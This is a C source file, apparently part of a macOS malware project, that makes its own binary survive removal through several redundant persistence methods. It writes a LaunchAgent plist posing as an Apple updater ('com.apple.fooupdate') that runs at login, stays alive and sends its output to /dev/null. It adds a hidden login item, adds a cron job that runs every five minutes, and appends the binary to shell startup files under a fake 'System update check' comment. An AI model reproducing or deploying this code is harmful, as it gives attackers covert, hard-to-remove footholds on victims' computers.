#include <aether.h>

static char *get_home(void) {
    struct passwd *pw = getpwuid(getuid());
    return pw ? strdup(pw->pw_dir) : NULL;
}

static char *get_self_path(void) {
    char buf[1024];
    uint32_t size = sizeof(buf);
    if (_NSGetExecutablePath(buf, &size) != 0) return NULL;
    return strdup(buf);
}

/* LaunchAgent persistence runs at login, keeps alive */
static int launch_agent(void) {
    char *home = get_home();
    char *exe = get_self_path();
    if (!home || !exe) {
        free(home);
        free(exe);
        return 0;
    }
    
    char plist_path[1024];
    snprintf(plist_path, sizeof(plist_path), "%s/Library/LaunchAgents/com.apple.fooupdate.plist", home);
    
    struct stat st;
    if (stat(plist_path, &st) == 0) {
        free(home);
        free(exe);
        return 1;
    }
    
    char plist[2048];
    snprintf(plist, sizeof(plist),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "    <key>Label</key>\n"
        "    <string>com.apple.fooupdate</string>\n"
        "    <key>ProgramArguments</key>\n"
        "    <array>\n"
        "        <string>%s</string>\n"
        "    </array>\n"
        "    <key>RunAtLoad</key>\n"
        "    <true/>\n"
        "    <key>KeepAlive</key>\n"
        "    <true/>\n"
        "    <key>StandardOutPath</key>\n"
        "    <string>/dev/null</string>\n"
        "    <key>StandardErrorPath</key>\n"
        "    <string>/dev/null</string>\n"
        "</dict>\n"
        "</plist>\n", exe);
    
    FILE *f = fopen(plist_path, "w");
    if (!f) {
        free(home);
        free(exe);
        return 0;
    }
    
    fwrite(plist, 1, strlen(plist), f);
    fclose(f);
    
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "launchctl load %s 2>/dev/null", plist_path);
    system(cmd);
    
    free(home);
    free(exe);
    return 1;
}

/* Login item via System Events */
static int login_item(void) {
    char *home = get_home();
    char *exe = get_self_path();
    if (!home || !exe) {
        free(home);
        free(exe);
        return 0;
    }
    
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "osascript -e 'tell application \"System Events\" to "
             "make login item at end with properties {path:\"%s\", hidden:true}' 2>/dev/null", exe);
    
    int ret = system(cmd);
    
    free(home);
    free(exe);
    return (ret == 0);
}

/* Cron job every 5 minutes */
static int install_cron(void) {
    char *exe = get_self_path();
    if (!exe) return 0;
    
    FILE *pipe = popen("crontab -l 2>/dev/null", "r");
    if (!pipe) {
        free(exe);
        return 0;
    }
    
    char existing[4096] = {0};
    size_t len = fread(existing, 1, sizeof(existing) - 1, pipe);
    pclose(pipe);
    
    if (strstr(existing, exe)) {
        free(exe);
        return 1;
    }
    
    char new_cron[5120];
    snprintf(new_cron, sizeof(new_cron), "%s*/5 * * * * %s >/dev/null 2>&1\n", existing, exe);
    
    pipe = popen("crontab -", "w");
    if (pipe) {
        fwrite(new_cron, 1, strlen(new_cron), pipe);
        pclose(pipe);
    }
    
    free(exe);
    return 1;
}

/* Shell profile injection runs on every shell start */
static int shell_profile(void) {
    char *home = get_home();
    char *exe = get_self_path();
    if (!home || !exe) {
        free(home);
        free(exe);
        return 0;
    }
    
    char profile_path[1024];
    /* Try zsh first( I use it ;) */
    snprintf(profile_path, sizeof(profile_path), "%s/.zshrc", home);
    
    struct stat st;
    if (stat(profile_path, &st) != 0) {
        snprintf(profile_path, sizeof(profile_path), "%s/.bash_profile", home);
    }
    
    FILE *f = fopen(profile_path, "r");
    if (f) {
        char buf[4096];
        size_t len = fread(buf, 1, sizeof(buf) - 1, f);
        buf[len] = '\0';
        fclose(f);
        
        if (strstr(buf, exe)) {
            free(home);
            free(exe);
            return 1;
        }
    }
    
    f = fopen(profile_path, "a");
    if (!f) {
        free(home);
        free(exe);
        return 0;
    }
    
    fprintf(f, "\n# System update check\n%s >/dev/null 2>&1 &\n", exe);
    fclose(f);
    
    free(home);
    free(exe);
    return 1;
}

/* if one is removed, others keep it alive */
int persist(void) {
    int success = 0;
    
    if (launch_agent()) success++;
    if (login_item()) success++;
    /*  
    if (install_cron()) success++;
    if (shell_profile()) success++; 
    */

    /* Be my Guest... */
    
    return success > 0;
}
